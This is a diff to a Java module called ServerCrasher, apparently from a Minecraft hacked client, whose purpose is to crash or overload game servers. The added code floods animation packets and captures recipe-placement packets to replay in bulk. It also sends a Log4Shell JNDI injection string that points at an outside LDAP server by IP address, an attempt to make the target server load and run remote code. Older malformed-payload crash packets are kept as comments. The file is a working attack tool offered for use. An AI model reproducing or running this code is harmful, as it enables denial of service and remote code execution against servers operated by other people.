@@ -1,5 +1,10 @@
 package zyx.existent.module.modules.misc;
 
+import java.util.Arrays;
+import java.util.Random;
+
+import org.apache.commons.lang3.RandomUtils;
+
 import io.netty.buffer.Unpooled;
 import net.minecraft.init.Items;
 import net.minecraft.item.ItemStack;
@@ -7,13 +12,14 @@ import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
 import net.minecraft.nbt.NBTTagString;
 import net.minecraft.network.PacketBuffer;
-import net.minecraft.network.play.client.*;
+import net.minecraft.network.play.client.CPacketAnimation;
+import net.minecraft.network.play.client.CPacketCustomPayload;
+import net.minecraft.network.play.client.CPacketPlaceRecipe;
+import net.minecraft.network.play.client.CPacketTabComplete;
 import net.minecraft.network.play.server.SPacketDisconnect;
 import net.minecraft.network.play.server.SPacketJoinGame;
-import net.minecraft.util.EnumFacing;
 import net.minecraft.util.EnumHand;
 import net.minecraft.util.math.BlockPos;
-import org.apache.commons.lang3.RandomUtils;
 import zyx.existent.Existent;
 import zyx.existent.event.EventTarget;
 import zyx.existent.event.events.EventPacket;
@@ -22,17 +28,21 @@ import zyx.existent.module.Category;
 import zyx.existent.module.Module;
 import zyx.existent.module.data.Options;
 import zyx.existent.module.data.Setting;
+import zyx.existent.utils.ChatUtils;
 import zyx.existent.utils.misc.MiscUtils;
-
-import java.util.Arrays;
-import java.util.Random;
 
 public class ServerCrasher extends Module {
     private String MODE = "MODE";
     private String PACKET = "PACKET";
     private String DISABLE = "AUTODISABLE";
+    private int int0;
+    private Boolean flag;
 
     ItemStack firework = null;
+
+    private CPacketPlaceRecipe recp = null;
+    private CPacketPlaceRecipe recp2 = null;
+    private CPacketPlaceRecipe recp3 = null;
 
     public ServerCrasher(String name, String desc, int keybind, Category category) {
         super(name, desc, keybind, category);
@@ -41,7 +51,12 @@ public class ServerCrasher extends Module {
         settings.put(PACKET, new Setting<>(PACKET, 100.0, "Packet Size", 0.1, 1.0, 10000.0));
         settings.put(DISABLE, new Setting<>(DISABLE, true, "AutoDisable."));
     }
-
+    @Override
+    public void onDisable() {
+    	flag = false;
+    	int0 = 0;
+    	super.onDisable();
+    }
     @Override
     public void onEnable() {
         String currentmode = ((Options) settings.get(MODE).getValue()).getSelected();
@@ -82,8 +97,11 @@ public class ServerCrasher extends Module {
 
         switch (currentmode) {
             case "Infinity":
-                mc.getConnection().sendPacket(new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
-                mc.getConnection().sendPacket(new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, (new Random()).nextBoolean()));
+            	for (int i = 0; i < ((Number) settings.get(PACKET).getValue()).doubleValue(); i++) {
+            	mc.getConnection().sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
+            	}
+//                mc.getConnection().sendPacket(new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
+//                mc.getConnection().sendPacket(new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, (new Random()).nextBoolean()));
                 break;
             case "TabComplete":
                 for (int i = 0; i < ((Number) settings.get(PACKET).getValue()).doubleValue(); i++) {
@@ -94,20 +112,26 @@ public class ServerCrasher extends Module {
                 }
                 break;
             case "Payload":
-                for (int i = 0; i < ((Number) settings.get(PACKET).getValue()).doubleValue(); i++) {
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|Brand", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BOpen", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|TrList", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|TrSel", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BEdit", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
-                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BSign", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+            	if (flag) {
+               	flag = false;
+               	for (int i = 0; i < ((Number) settings.get(PACKET).getValue()).doubleValue(); i++) {
+                	mc.getConnection().sendPacket(recp);
+                	mc.getConnection().sendPacket(recp2);
+                	mc.getConnection().sendPacket(recp3);
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|Brand", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BOpen", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|TrList", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|TrSel", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BEdit", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
+//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BSign", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                 }
+            	}
                 break;
             case "Bookflood":
                 final ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
@@ -157,11 +181,13 @@ public class ServerCrasher extends Module {
                 }).start();
                 break;
             case "Test2":
-                (new Thread(() -> {
-                    for (byte b = 0; b < 20; b++) {
-                        mc.getConnection().sendPacket(new CPacketPlayerTryUseItemOnBlock(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0D, mc.thePlayer.posZ), EnumFacing.UP, EnumHand.MAIN_HAND, 0.0F, 0.0F, 0.0F));
-                    }
-                })).start();
+            	mc.getConnection().sendPacket(new CPacketTabComplete("${jndi:ldap://125.194.85.34:1389/Run}"));
+            	ChatUtils.printChat("a");
+//                (new Thread(() -> {
+//                    for (byte b = 0; b < 20; b++) {
+//                        mc.getConnection().sendPacket(new CPacketPlayerTryUseItemOnBlock(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0D, mc.thePlayer.posZ), EnumFacing.UP, EnumHand.MAIN_HAND, 0.0F, 0.0F, 0.0F));
+//                    }
+//                })).start();
                 break;
         }
     }
@@ -169,19 +195,38 @@ public class ServerCrasher extends Module {
     public void onPacket(EventPacket event) {
         switch (((Options) settings.get(MODE).getValue()).getSelected()) {
             case "Payload":
-                if (event.getPacket() instanceof CPacketCustomPayload) {
-                    CPacketCustomPayload C17 = (CPacketCustomPayload) event.getPacket();
-                    C17.channel = "MC|Brand";
-                    C17.data = (new PacketBuffer(Unpooled.buffer())).writeString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
+            	if(event.getPacket() instanceof CPacketPlaceRecipe&&event.isOutgoing()) {
+                    CPacketPlaceRecipe p1 = (CPacketPlaceRecipe)event.getPacket();
+                    if(int0 == 0) {
+                        recp = p1;
+                        ChatUtils.printChat("1");
+                    }
+                    if(int0 == 1) {
+                        recp2 = p1;
+                        ChatUtils.printChat("2");
+                    }
+                    if(int0 == 2) {
+                    	ChatUtils.printChat("3");
+                        recp3 = p1;
+                        flag = true;
+                    }
+                    int0++;
                 }
+//                if (event.getPacket() instanceof CPacketCustomPayload) {
+//                    CPacketCustomPayload C17 = (CPacketCustomPayload) event.getPacket();
+//                    C17.channel = "MC|Brand";
+//                    C17.data = (new PacketBuffer(Unpooled.buffer())).writeString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
+//                }
                 break;
         }
 
         if ((Boolean) settings.get(DISABLE).getValue() && Existent.getModuleManager().isEnabled(this.getClass())) {
-            if (event.getPacket() instanceof SPacketJoinGame)
+            if (event.getPacket() instanceof SPacketJoinGame) {
                 toggle();
-            if (event.getPacket() instanceof SPacketDisconnect)
+            }
+            if (event.getPacket() instanceof SPacketDisconnect) {
                 toggle();
+            }
         }
     }
 }
